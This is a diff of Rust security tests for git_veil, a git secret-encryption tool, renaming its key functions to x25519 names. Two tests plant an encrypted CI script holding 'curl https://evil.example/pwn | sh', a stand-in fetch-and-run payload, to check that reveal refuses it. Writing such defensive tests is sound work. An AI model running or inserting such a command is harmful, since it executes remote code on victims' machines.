@@ -8,8 +8,8 @@ use age::secrecy::ExposeSecret;
 use git_veil::{
     cmd_add, cmd_export_pin, cmd_hide, cmd_import, cmd_init, cmd_remove, cmd_removeperson,
     cmd_reveal, cmd_tell, cmd_trust, cmd_trust_import, cmd_unhide, cmd_verify_keyring,
-    decrypt_with_identity, exit_code_of, generate_identity, generate_signing_keypair,
-    recipient_from_identity, TrackedFiles,
+    decrypt_with_x25519_private_key, exit_code_of, generate_signing_keypair,
+    generate_x25519_private_key, x25519_public_key_encoding, TrackedFiles,
 };
 
 use std::fs;
@@ -74,8 +74,8 @@ impl Fixture {
         let key_store = TempDir::new(&format!("{}-ks", label));
         init_git_repo(&repo.path);
 
-        let identity = generate_identity();
-        let recipient = recipient_from_identity(&identity);
+        let identity = generate_x25519_private_key();
+        let recipient = x25519_public_key_encoding(&identity);
         let (signing_key, verifying_hex) = generate_signing_keypair();
 
         fs::write(
@@ -104,8 +104,8 @@ impl Fixture {
     /// Tells a collaborator into the keyring; returns their identity so the
     /// test can later prove what that key can (still) decrypt.
     fn add_collab(&self, email: &str) -> age::x25519::Identity {
-        let id = generate_identity();
-        let r = recipient_from_identity(&id);
+        let id = generate_x25519_private_key();
+        let r = x25519_public_key_encoding(&id);
         let fname = format!("{}.recipient", email);
         fs::write(self.repo.join(&fname), &r).unwrap();
         cmd_tell(
@@ -634,7 +634,7 @@ fn fix_detracking_orphan_ciphertext_refuses_hide() {
     // The revoked collaborator can no longer decrypt the live ciphertext.
     let ciphertext = fs::read(f.repo.join("api.key.secret")).unwrap();
     assert!(
-        decrypt_with_identity(&ciphertext, &carol).is_err(),
+        decrypt_with_x25519_private_key(&ciphertext, &carol).is_err(),
         "revoked carol must not decrypt the post-rotation ciphertext"
     );
 }
@@ -706,8 +706,8 @@ fn fix_reveal_refuses_tracked_in_git_plaintext() {
 
     // The victim: a legitimate collaborator with an identity in their key
     // store (this store simulates the victim's machine).
-    let victim = generate_identity();
-    let victim_recipient = recipient_from_identity(&victim);
+    let victim = generate_x25519_private_key();
+    let victim_recipient = x25519_public_key_encoding(&victim);
     fs::write(f.repo.join("victim.recipient"), &victim_recipient).unwrap();
     cmd_tell(
         &f.repo.path,
@@ -747,10 +747,10 @@ fn fix_reveal_refuses_tracked_in_git_plaintext() {
     let recipients: Vec<_> = ring
         .entries
         .iter()
-        .map(|e| git_veil::parse_recipient(&e.recipient).unwrap())
+        .map(|e| git_veil::parse_x25519_public_key(&e.public_key).unwrap())
         .collect();
     let payload = b"#!/bin/sh\ncurl https://evil.example/pwn | sh\n";
-    let evil_ct = git_veil::encrypt_to_recipients(payload, &recipients).unwrap();
+    let evil_ct = git_veil::encrypt_to_x25519_public_keys(payload, &recipients).unwrap();
     fs::write(f.repo.join("ci/deploy.sh.secret"), evil_ct).unwrap();
     f.stage_all(); // attacker commits tracked.json + the evil ciphertext
 
@@ -907,10 +907,10 @@ fn fix_baseline_not_poisoned_by_unsigned_empty_keyring() {
 #[test]
 fn fix_case_variant_refused_by_tracked_plaintext_gate() {
     let f = Fixture::new("case-variant");
-    let victim = generate_identity();
+    let victim = generate_x25519_private_key();
     fs::write(
         f.repo.join("victim.recipient"),
-        recipient_from_identity(&victim),
+        x25519_public_key_encoding(&victim),
     )
     .unwrap();
     cmd_tell(
@@ -945,12 +945,12 @@ fn fix_case_variant_refused_by_tracked_plaintext_gate() {
     let recipients: Vec<_> = ring
         .entries
         .iter()
-        .map(|e| git_veil::parse_recipient(&e.recipient).unwrap())
+        .map(|e| git_veil::parse_x25519_public_key(&e.public_key).unwrap())
         .collect();
     let payload = b"#!/bin/sh\ncurl https://evil.example/pwn | sh\n";
     fs::write(
         f.repo.join("ci/BUILD.SH.secret"),
-        git_veil::encrypt_to_recipients(payload, &recipients).unwrap(),
+        git_veil::encrypt_to_x25519_public_keys(payload, &recipients).unwrap(),
     )
     .unwrap();
     f.stage_all();
